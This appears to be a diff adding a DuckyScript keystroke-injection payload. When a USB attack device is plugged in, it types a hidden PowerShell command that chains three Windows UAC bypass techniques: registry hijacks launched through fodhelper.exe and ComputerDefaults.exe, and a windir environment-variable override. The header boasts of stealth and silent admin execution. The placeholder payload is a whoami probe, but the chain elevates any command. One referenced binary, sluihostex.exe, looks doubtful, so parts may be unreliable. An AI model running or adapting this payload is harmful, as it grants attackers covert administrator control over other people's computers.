@@ -1,0 +1,13 @@
+REM ============================================
+REM  FU PERSON | UAC Bypass + Elevate
+REM  FLLC - by PERSON FU
+REM  Time: ~8 seconds | Stealth: MEDIUM
+REM  Multiple UAC bypass techniques chained
+REM  Then executes payload as admin silently
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$payload='cmd /c whoami > %TEMP%\elevated.txt';$method1={$r='HKCU:\Software\Classes\ms-settings\shell\open\command';New-Item $r -f|Out-Null;Set-ItemProperty $r -Name '(Default)' -Value $payload;New-ItemProperty $r -Name 'DelegateExecute' -Value '' -f|Out-Null;Start-Process 'C:\Windows\System32\fodhelper.exe' -WindowStyle Hidden;sleep 3;Remove-Item 'HKCU:\Software\Classes\ms-settings' -r -f};$method2={$r='HKCU:\Software\Classes\ms-settings\shell\open\command';New-Item $r -f|Out-Null;Set-ItemProperty $r -Name '(Default)' -Value $payload;New-ItemProperty $r -Name 'DelegateExecute' -Value '' -f|Out-Null;Start-Process 'C:\Windows\System32\ComputerDefaults.exe' -WindowStyle Hidden;sleep 3;Remove-Item 'HKCU:\Software\Classes\ms-settings' -r -f};$method3={$env:windir='cmd /k '+$payload;Start-Process 'C:\Windows\System32\sluihostex.exe' -WindowStyle Hidden;sleep 2;$env:windir=$env:SystemRoot};try{&$method1}catch{};if(!(Test-Path $env:TEMP\elevated.txt)){try{&$method2}catch{}};if(!(Test-Path $env:TEMP\elevated.txt)){try{&$method3}catch{}}"
+ENTER
+DELAY 500
